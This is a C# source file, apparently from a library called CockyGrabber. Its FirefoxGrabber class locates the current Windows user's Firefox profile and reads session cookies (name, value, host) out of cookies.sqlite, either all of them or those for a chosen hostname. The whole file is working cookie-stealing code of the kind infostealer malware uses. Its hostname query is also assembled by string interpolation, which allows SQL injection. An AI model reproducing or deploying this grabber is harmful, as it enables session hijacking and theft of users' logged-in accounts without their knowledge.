using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Cookie = CockyGrabber.Classes.Cookie;

namespace CockyGrabber
{
    public class FirefoxGrabber
    {
        public string FirefoxProfilesPath = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Mozilla\Firefox\Profiles";
        public string FirefoxCookiePath { get; private set; } // can't make this constant because firefox profiles are made of random chars

        public FirefoxGrabber()
        {
            foreach (string folder in Directory.GetDirectories(FirefoxProfilesPath))
                if (folder.Contains("default-release"))
                {
                    FirefoxCookiePath = folder + @"\cookies.sqlite";
                }
        }


        /// <summary>
        /// Returns a value depending on if the File "cookies.sqlite" was found
        /// </summary>
        /// <returns>true if Cookies was found and false if not</returns>
        public bool CookiesExists()
        {
            if (File.Exists(FirefoxCookiePath))
                return true;
            return false;
        }


        public List<Cookie> GetCookiesByHostname(string hostName)
        {
            List<Cookie> cookies = new List<Cookie>();
            if (hostName == null) throw new ArgumentNullException("hostName"); // throw ArgumentNullException if hostName is null
            if (!CookiesExists()) throw new FileNotFoundException("Cant find cookie store", FirefoxCookiePath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found

            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={FirefoxCookiePath};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = $"SELECT name,value,host FROM moz_cookies WHERE host = '{hostName}'";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        cookies.Add(new Cookie()
                        {
                            HostName = reader.GetString(2),
                            Name = reader.GetString(0),
                            Value = reader.GetString(1)
                        });
                    }
                }
                conn.Close();
            }
            return cookies;
        }
        public List<Cookie> GetAllCookies()
        {
            List<Cookie> cookies = new List<Cookie>();
            if (!CookiesExists()) throw new FileNotFoundException("Cant find cookie store", FirefoxCookiePath);  // throw FileNotFoundException if cookie Path not found

            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={FirefoxCookiePath};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = $"SELECT name,value,host FROM moz_cookies";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        cookies.Add(new Cookie()
                        {
                            HostName = reader.GetString(2),
                            Name = reader.GetString(0),
                            Value = reader.GetString(1)
                        });
                    }
                }
                conn.Close();
            }
            return cookies;
        }





    }
}
